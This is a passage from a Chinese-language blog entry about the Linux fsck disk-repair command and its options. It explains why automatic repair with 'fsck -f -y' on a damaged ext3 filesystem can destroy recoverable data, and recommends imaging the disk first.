不执行指令，仅列出实际执行会进行的动作。<br> -P 当搭配”-A”参数使用时，则会同时检查所有的文件系统。<br> -r 采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式。<br> -R 当搭配”-A”参数使用时，则会略过/目录的文件系统不予检查。<br> -s 依序执行检查作业，而非同时执行。<br> -t&lt;文件系统类型&gt; 指定要检查的文件系统类型。<br> -T 执行fsck指令时，不显示标题信息。<br> -V 显示指令执行过程。<br> fdisk -l 查看设备号<br> 运行 fsck -y /dev/sdb1 修复磁盘 -y参数为自动确认修复<br> 这条命令也是用fsck修复磁盘是，常使用的命令</p><p>特别说明：在EXT3（实际上其他文件系统也类似）无法mount，或者提示fsck时，如果有重要数据，应该慎重对待，千万不可贸然执行”fsck -f  -y　“这样的自动修复功能。如果可能，先对故障区域做dd全镜像后再执行，或者以只读方式执行，并仔细看修复过程，如果提示大量inode错误、需要重建树、或大小不对等就不可再继续下去了。</p><h3 id="Linux-ext3-fsck一定要慎用"><a href="#Linux-ext3-fsck一定要慎用" class="headerlink" title="Linux ext3 fsck一定要慎用"></a>Linux ext3 fsck一定要慎用</h3><p>不管是哪种文件系统，其根本目的都是相同的：如何把文件存在系统给定的区域里，如何有效地管理文件的读与写。为实现这样的目的，驱动层需要完善、周密地应付附加在文件系统上的各种操作。这些操作通常不会是一条指令完成的，如果一个过程需要多条指令完成，在执行这些操作时，全部指令未完成的情况下产生中断，那这个文件系统便会出现一致性错误(或者叫连续性错误)。</p><p>为了保证尽可以少的出现一致性错误，现在主流的文件系统都会设计成日志型的。日志型文件系统的主要特点就是把一个操作的所有指令执行过程都另外缓冲下来，如果全部执行完成再清除日志标志，如果操作没有执行完成，可以在重新激活后通过日志回溯或继续完成。</p><p>EXT3的日志功能通过在EXT2的设计基础上增加一个特殊的文件(通常是８号节点文件)，在这个文件中记录文件系统的操作过程。但EXT系统文件系统本身在节点、间接索引块、目录节点方面没有冗余保护，所以当文件系统除日志外的其他结构并不一致，却又要通过fsck来进行修复，这种一致性有可能将原本正确的结构也错误化。(就像原来是1+2=3，现在错成了1+3=3，也许改完后变成了1+3=4，就完全没办法还原成最早的1+2=3)。</p><p>数据恢复领域经常会遇到这类情况：一次RAID出故障后，下次启动系统提示做fsck，但做完后，也无法mount分区或者mount  分区后数据全是错的。需要对这类情况进行数据修复的难度是很大的，从一个完整的结构(fsck后实际上从系统角度看已经是完整的了)再构建另一个完全不同的结构要比修正一个错误的结构更难以下手。其实这类情况，很多是因为RAID5有早离线的盘加入了两个逻辑磁盘组，导致所有的数据流是以新+旧的方式交错组成的，自然会有太多错误。这时候如果做fsck后，有可能数据都无法恢复了。</p><p>所以，在EXT3（实际上其他文件系统也类似）无法mount，或者提示fsck时，如果有重要数据，应该慎重对待，千万不可贸然执行”fsck  -f  -y　“这样的自动修复功能。如果可能，先对故障区域做dd全镜像后再执行，或者以只读方式执行，并仔细看修复过程，如果提示大量inode错误、需要重建树、或大小不对等就不可再继续下去了。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
